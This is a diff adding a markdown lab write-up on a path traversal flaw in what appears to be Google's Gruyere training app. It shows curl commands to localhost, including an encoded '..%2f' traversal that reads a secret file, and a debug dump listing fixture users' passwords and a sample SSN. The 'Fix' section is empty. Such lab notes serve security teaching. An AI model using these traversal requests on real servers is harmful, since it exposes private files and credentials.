@@ -1,0 +1,78 @@
+# Path traversal
+
+## exploit
+
+To access unauthorized files, path traversal can be used with
+
+`curl http://127.0.0.1:8008/..%2f/secret.txt`
+giving : 
+`Cookie!` 
+
+Other files can be attacked 
+
+`curl http://127.0.0.1:8008/dump.gtl`
+
+giving : 
+``` 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<!-- Copyright 2017 Google Inc. -->
+<html>
+<head>
+<title>Debug Dump</title>
+</head>
+<body>
+<table>
+  <tr>
+    <td valign='top'>_cookie:&nbsp;</td>
+    <td valign='top'><pre>{&#x27;is_admin&#x27;: False, &#x27;is_author&#x27;: False, &#x27;uid&#x27;: None}</pre></td>
+  </tr>
+  <tr>
+    <td valign='top'>_profile:&nbsp;</td>
+    <td valign='top'><pre>None</pre></td>
+  </tr>
+  <tr>
+    <td valign='top'>_db:&nbsp;</td>
+    <td valign='top'><pre>{&#x27;administrator&#x27;: {&#x27;is_admin&#x27;: True,
+                   &#x27;is_author&#x27;: False,
+                   &#x27;name&#x27;: &#x27;Admin&#x27;,
+                   &#x27;private_snippet&#x27;: &#x27;My password is secret. Get it?&#x27;,
+                   &#x27;pw&#x27;: &#x27;secret&#x27;,
+                   &#x27;web_site&#x27;: &#x27;https://www.google.com/contact/&#x27;},
+ &#x27;brie&#x27;: {&#x27;color&#x27;: &#x27;red; text-decoration:underline&#x27;,
+          &#x27;is_admin&#x27;: False,
+          &#x27;is_author&#x27;: True,
+          &#x27;name&#x27;: &#x27;Brie&#x27;,
+          &#x27;private_snippet&#x27;: &#x27;I use the same password for all my accounts.&#x27;,
+          &#x27;pw&#x27;: &#x27;briebrie&#x27;,
+          &#x27;snippets&#x27;: [&#x27;Brie is the queen of the cheeses&lt;span &#x27;
+                       &#x27;style=color:red&gt;!!!&lt;/span&gt;&#x27;],
+          &#x27;web_site&#x27;: &#x27;https://news.google.com/news/search?q=brie&#x27;},
+ &#x27;cheddar&#x27;: {&#x27;color&#x27;: &#x27;blue&#x27;,
+             &#x27;is_admin&#x27;: False,
+             &#x27;is_author&#x27;: True,
+             &#x27;name&#x27;: &#x27;Cheddar Mac&#x27;,
+             &#x27;private_snippet&#x27;: &#x27;My SSN is &lt;a &#x27;
+                                &#x27;href=&quot;https://www.google.com/search?q=078-05-1120&quot;&gt;078-05-1120&lt;/a&gt;.&#x27;,
+             &#x27;pw&#x27;: &#x27;orange&#x27;,
+             &#x27;snippets&#x27;: [&#x27;Gruyere is the cheesiest application on the web.&#x27;,
+                          &#x27;I wonder if there are any security holes in &#x27;
+                          &#x27;this....&#x27;],
+             &#x27;web_site&#x27;: &#x27;https://images.google.com/?q=cheddar+cheese&#x27;},
+ &#x27;sardo&#x27;: {&#x27;color&#x27;: &#x27;red&#x27;,
+           &#x27;is_admin&#x27;: False,
+           &#x27;is_author&#x27;: True,
+           &#x27;name&#x27;: &#x27;Miss Sardo&#x27;,
+           &#x27;private_snippet&#x27;: &#x27;I hate my brother Romano.&#x27;,
+           &#x27;pw&#x27;: &#x27;odras&#x27;,
+           &#x27;snippets&#x27;: [],
+           &#x27;web_site&#x27;: &#x27;https://www.google.com/search?q=&quot;pecorino+sardo&quot;&#x27;}}</pre></td>
+  </tr>
+</table>
+</body>
+</html>
+```
+
+## Fix
+
+
+
